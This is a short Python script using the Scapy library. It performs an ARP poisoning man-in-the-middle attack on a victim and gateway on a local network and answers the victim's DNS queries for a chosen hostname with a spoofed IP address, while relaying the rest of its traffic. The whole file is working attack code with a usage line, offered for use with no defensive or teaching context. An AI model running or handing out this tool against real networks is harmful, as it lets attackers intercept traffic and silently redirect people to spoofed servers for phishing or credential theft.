#!/usr/bin/env python
# DNS poisoning attack! Relied on ARP poisoning attack MITM.
# Performs an ARP poisoning attacks against both victim and
# gateway (bidirectional ARP poisoning).
#
# Usage: dns-poisoning.py <IFACE> <VICTIM> <GATEWAY> <SPOOFED-HOSTNAME> <SPOOFED-IP>
# Example: dns-poisoning.py wlan0 192.168.1.108 192.168.1.1

from scapy.all import *
import os
import subprocess
import sys
import thread
import time

iface = sys.argv[1]
victim_ip = sys.argv[2]
gateway_ip = sys.argv[3]
local_mac = get_if_hwaddr(iface)
local_ip = get_if_addr(iface)
dns_spoof_name = sys.argv[4]
dns_spoof_ip = sys.argv[5]	# IP to give as DNS answer

# Hacky way to obtain gateway and victim MAC from local arp cache
gateway_mac = subprocess.check_output(("arp", gateway_ip)).split()[8]
victim_mac = subprocess.check_output(("arp", victim_ip)).split()[8]

print " VICTIM: ", victim_ip, victim_mac
print "  LOCAL: ", local_ip, local_mac
print "GATEWAY: ", gateway_ip, gateway_mac

# A sloppy arp poisoning attack
def arp_poison():
	pkt_to_victim = Ether()/ARP(op=2, hwdst=local_mac, psrc=gateway_ip, pdst=victim_ip)
	pkt_to_gateway = Ether()/ARP(op=2, hwdst=local_mac, psrc=victim_ip, pdst=gateway_ip)
	while True:
		sendp(pkt_to_victim, verbose=0)
		sendp(pkt_to_gateway, verbose=0)
		time.sleep(1)

# Handles captured packets
def handle_packet(pkt):
	# Handle DNS requests and spoof them
	# DNS opcode of 0L is query!
	if DNS in pkt and UDP in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0:
		qname = pkt[DNSQR].qname
		print dns_spoof_name
		if dns_spoof_name not in qname:
			return
		print "\nDNS Question Record: " + qname
		print pkt.summary()
		reply = IP(src=gateway_ip, dst=pkt[IP].src) \
			/UDP(dport=pkt[UDP].sport, sport=53) \
			/DNS(id=pkt[DNS].id, ancount=1, qr=1, aa=1, \
				qd=pkt[DNS].qd, \
				an=DNSRR(rrname=pkt[DNSQR].qname, \
				rdata=dns_spoof_ip))
		print reply.summary() + "\n"

		send(reply, verbose=0)

	# Forward packets to real gateway (VICTIM -> GATEWAY)
	# These conditions are met if ARP poisoning against victim machine is successful
	elif IP in pkt and pkt[Ether].src == victim_mac and pkt[Ether].dst == local_mac:
		pkt[Ether].dst = gateway_mac
		pkt[Ether].src = local_mac
		print "Outbound: " + pkt.summary()
		sendp(pkt, verbose=0)

	# Forward packets to victim (GATEWAY -> VICTIM)
	# These conditions are met if ARP poisoning against gateway is successful
	elif IP in pkt and pkt[Ether].src == gateway_mac and pkt[Ether].dst == local_mac:
		pkt[Ether].dst = victim_mac
		print "Inbound: " + pkt.summary()
		sendp(pkt, verbose=0)

thread.start_new_thread(arp_poison, ())

bpfilter = "ip host " + victim_ip
sniff(iface=iface, filter=bpfilter, prn=handle_packet)
